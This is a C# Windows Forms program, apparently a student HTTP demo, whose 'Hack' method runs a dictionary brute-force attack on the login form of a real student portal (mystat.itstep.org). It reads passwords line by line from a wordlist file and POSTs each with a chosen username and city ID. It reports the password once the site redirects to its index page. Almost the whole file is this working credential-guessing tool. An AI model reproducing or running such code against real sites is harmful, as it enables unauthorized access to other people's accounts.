using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using HtmlAgilityPack;
using System.Threading;

namespace NP_HttpDemo
{
    public partial class FormMain : Form
    {
        private readonly Uri _uri = null;
        private readonly CookieContainer cookies = null;
        Thread hThread = null;

        private string pass;

        public FormMain()
        {
            InitializeComponent();

            _uri = new Uri("http://mystat.itstep.org/login/index");
            cookies = new CookieContainer();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            hThread = new Thread(Hack);
            hThread.Start();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Все файлы|*.*";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                textBox2.Text = ofd.FileName;
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (hThread != null)
                if (hThread.IsAlive)
                    hThread.Abort();
        }

        private void Hack()
        {
            if (comboBox1.SelectedIndex == -1)
            {
                MessageBox.Show("Выберите город!");
                return;
            }
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                MessageBox.Show("Введите логин!");
                return;
            }
            if (string.IsNullOrEmpty(textBox2.Text))
            {
                MessageBox.Show("Введите путь к словарю!");
                return;
            }

            try
            {
                bool _IsHacked = false;
                StreamReader SR = new StreamReader(textBox2.Text, Encoding.Default);
                progressBar1.Invoke(new ThreadStart(delegate
                {
                    progressBar1.Maximum = (int)new FileInfo(textBox2.Text).Length + 2;
                }));
                while ((pass = SR.ReadLine()) != null)
                {
                    var request = (HttpWebRequest)HttpWebRequest.Create(_uri);
                    request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0";
                    request.Headers.Add("Accept-Language", Application.CurrentCulture.Name);

                    request.CookieContainer = cookies;

                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded"; //!Important

                    int city_id = comboBox1.SelectedIndex;
                    if (city_id >= 14)
                        city_id++;
                    string data = "city_id=" + city_id + "&LoginForm[username]=" + textBox1.Text + "&LoginForm[password]=" + pass;

                    request.ContentLength = data.Length; //Сказали серверу сколько байт считать из тела запроса

                    var streamRequest = request.GetRequestStream();
                    streamRequest.Write(Encoding.GetEncoding(1251).GetBytes(data), 0, data.Length);

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse(); //Выполняем запрос и получаем ответ
                    Uri url = new Uri("http://mystat.itstep.org/index");
                    if (response.ResponseUri == url)
                    {
                        _IsHacked = true;
                        label3.Invoke(new ThreadStart(delegate
                        {
                            label3.Text = string.Format("Пароль: \"{0}\"", pass);
                        }));
                        MessageBox.Show(string.Format("Пароль: \"{0}\"", pass));
                        break;
                    }
                    request.Abort();
                    streamRequest.Close();
                    progressBar1.Invoke(new ThreadStart(delegate
                    {
                        progressBar1.Value += pass.Length + 2;
                    }));
                }
                SR.Close();
                if (!_IsHacked)
                    MessageBox.Show("Ни один пароль не подошел!\nВозможно, стоит использовать другой словарь.", "Взлом не удался!");
            }
            catch (ThreadAbortException)
            {

            }
            catch (Exception ex)
            {
                label3.Invoke(new ThreadStart(delegate
                {
                    label3.Text = string.Format("Последний пароль: \"{0}\"", pass);
                }));
                MessageBox.Show(ex.Message, "Ошибка");
            }
        }
    }
}
